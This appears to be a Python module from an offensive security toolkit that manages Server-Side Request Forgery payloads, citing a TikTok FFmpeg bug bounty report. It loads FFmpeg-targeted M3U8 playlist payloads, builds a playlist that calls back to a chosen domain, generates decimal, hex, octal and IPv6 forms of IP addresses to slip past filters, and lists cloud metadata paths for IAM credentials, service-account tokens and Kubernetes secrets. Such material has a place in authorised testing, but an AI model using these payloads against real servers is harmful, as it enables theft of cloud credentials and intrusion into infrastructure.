"""
SSRF Payload Library
====================

Pre-built payloads for Server-Side Request Forgery testing.

Learned from: TikTok FFmpeg SSRF (HackerOne #1062888 - $2,727)

Contents:
- hls_m3u8/: HLS playlist payloads for FFmpeg
- ffmpeg_specific/: FFmpeg-targeted payloads
- bypass_techniques/: IP representation, redirects, protocol smuggling

Usage:
    from blackbox.modules.payloads.ssrf import SSRFPayloads

    payloads = SSRFPayloads()

    # Get AWS metadata payload
    aws = payloads.get_m3u8('aws_metadata')

    # Get all bypass techniques
    bypasses = payloads.get_bypass_techniques()

Author: DeadMan Toolkit v5.3
"""

import os
from pathlib import Path
from typing import Dict, List, Optional


class SSRFPayloads:
    """
    SSRF payload manager.

    Provides access to pre-built payloads for various SSRF scenarios.
    """

    def __init__(self):
        self.base_path = Path(__file__).parent

    def get_m3u8(self, name: str) -> str:
        """Get an M3U8 playlist payload"""
        path = self.base_path / 'hls_m3u8' / f'{name}.m3u8'
        if path.exists():
            return path.read_text()
        raise FileNotFoundError(f"Payload not found: {name}")

    def list_m3u8(self) -> List[str]:
        """List available M3U8 payloads"""
        m3u8_dir = self.base_path / 'hls_m3u8'
        return [f.stem for f in m3u8_dir.glob('*.m3u8')]

    def get_bypass_technique(self, name: str) -> str:
        """Get bypass technique documentation"""
        path = self.base_path / 'bypass_techniques' / f'{name}.txt'
        if path.exists():
            return path.read_text()
        raise FileNotFoundError(f"Technique not found: {name}")

    def list_bypass_techniques(self) -> List[str]:
        """List available bypass techniques"""
        bypass_dir = self.base_path / 'bypass_techniques'
        return [f.stem for f in bypass_dir.glob('*.txt')]

    def get_all_payloads(self) -> Dict[str, str]:
        """Get all payloads as a dictionary"""
        payloads = {}
        for name in self.list_m3u8():
            payloads[f'm3u8/{name}'] = self.get_m3u8(name)
        for name in self.list_bypass_techniques():
            payloads[f'bypass/{name}'] = self.get_bypass_technique(name)
        return payloads

    def generate_callback_m3u8(self, callback_domain: str) -> str:
        """Generate M3U8 with custom callback domain"""
        template = self.get_m3u8('dns_callback')
        return template.replace('CALLBACK_DOMAIN', callback_domain)

    @staticmethod
    def ip_to_decimal(ip: str) -> int:
        """Convert IP address to decimal representation"""
        octets = [int(o) for o in ip.split('.')]
        return (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]

    @staticmethod
    def ip_to_hex(ip: str) -> str:
        """Convert IP address to hex representation"""
        octets = [int(o) for o in ip.split('.')]
        return '0x' + ''.join(f'{o:02x}' for o in octets)

    @staticmethod
    def generate_ip_variants(ip: str) -> List[str]:
        """Generate various representations of an IP address"""
        octets = [int(o) for o in ip.split('.')]

        return [
            ip,  # Standard
            str(SSRFPayloads.ip_to_decimal(ip)),  # Decimal
            SSRFPayloads.ip_to_hex(ip),  # Hex
            '.'.join(f'0{o:o}' for o in octets),  # Octal
            f'::ffff:{ip}',  # IPv6 mapped
            f'[::ffff:{ip}]',  # IPv6 bracketed
        ]


# Cloud metadata endpoints
CLOUD_METADATA = {
    'aws': {
        'base': 'http://169.254.169.254',
        'endpoints': [
            '/latest/meta-data/',
            '/latest/meta-data/iam/security-credentials/',
            '/latest/dynamic/instance-identity/document',
            '/latest/user-data'
        ]
    },
    'gcp': {
        'base': 'http://metadata.google.internal',
        'headers': {'Metadata-Flavor': 'Google'},
        'endpoints': [
            '/computeMetadata/v1/',
            '/computeMetadata/v1/instance/service-accounts/default/token',
            '/computeMetadata/v1/project/project-id'
        ]
    },
    'azure': {
        'base': 'http://169.254.169.254',
        'headers': {'Metadata': 'true'},
        'endpoints': [
            '/metadata/instance?api-version=2021-02-01',
            '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
        ]
    },
    'digitalocean': {
        'base': 'http://169.254.169.254',
        'endpoints': [
            '/metadata/v1/',
            '/metadata/v1/id',
            '/metadata/v1/user-data'
        ]
    },
    'kubernetes': {
        'base': 'https://kubernetes.default.svc',
        'endpoints': [
            '/api/',
            '/api/v1/namespaces/',
            '/api/v1/secrets'
        ]
    }
}
